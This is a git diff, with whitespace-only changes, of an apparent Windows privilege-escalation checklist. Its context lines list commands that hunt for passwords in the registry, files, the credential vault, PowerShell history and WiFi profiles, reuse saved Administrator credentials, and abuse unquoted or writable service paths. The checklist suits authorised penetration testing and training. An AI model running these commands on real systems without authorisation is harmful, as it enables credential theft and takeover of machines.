@@ -1,8 +1,8 @@
 # checklist-to-escalate
 
-**Author:** Julien Bongars  
+**Author:** Julien Bongars\
 **Date:** 2025-10-16 00:07:04
-**Path:** 
+**Path:**
 
 ---
 
@@ -103,6 +103,7 @@
 ## Credentials & Passwords
 
 ### Registry
+
 - [ ] `reg query HKLM /f password /t REG_SZ /s` - Search registry for passwords
 - [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` - AutoLogon
 - [ ] `reg query "HKCU\Software\ORL\WinVNC3\Password"` - VNC passwords
@@ -110,6 +111,7 @@
 - [ ] `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` - PuTTY sessions
 
 ### Files
+
 - [ ] `findstr /si password *.xml *.ini *.txt *.config 2>nul` - Search files
 - [ ] `dir /s /b C:\*password* 2>nul`
 - [ ] `dir /s /b C:\*.config 2>nul`
@@ -119,16 +121,19 @@
 - [ ] Search user directories: Desktop, Documents, Downloads
 
 ### Saved Credentials
+
 - [ ] `cmdkey /list` - Saved credentials
 - [ ] `vaultcmd /listcreds:"Windows Credentials"` - Windows Vault
 - [ ] `runas /savecred /user:Administrator cmd.exe` - Use saved creds
 
 ### Application Configs
+
 - [ ] PHP: `type C:\xampp\htdocs\config.php`, `type C:\inetpub\wwwroot\web.config`
 - [ ] Database configs: `findstr /si connectionString *.config`
 - [ ] Look for: `.env`, `config.php`, `web.config`, `appsettings.json`
 
 ### Backups
+
 - [ ] `dir /s /b C:\*.bak 2>nul`
 - [ ] `dir /s /b C:\*.backup 2>nul`
 - [ ] `dir /s /b C:\*.old 2>nul`
@@ -136,6 +141,7 @@
 - [ ] Check: `C:\Backup`, `C:\Users\*\Desktop\backup`
 
 ### Other
+
 - [ ] `type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
 - [ ] `netsh wlan show profile` → `netsh wlan show profile <SSID> key=clear` - WiFi passwords
 - [ ] Browser data: cookies, saved passwords, history
@@ -168,6 +174,7 @@
 ## Quick Wins
 
 ### Unquoted Service Paths
+
 ```batch
 # Find them
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
@@ -179,6 +186,7 @@ sc stop <service> && sc start <service>
 ```
 
 ### Weak Service Permissions
+
 ```batch
 # Check permissions
 accesschk.exe -uwcqv "Everyone" *
@@ -189,6 +197,7 @@ sc stop <service> && sc start <service>
 ```
 
 ### Writable Service Binary
+
 ```batch
 # Check if you can overwrite
 icacls "C:\Program Files\Service\service.exe"
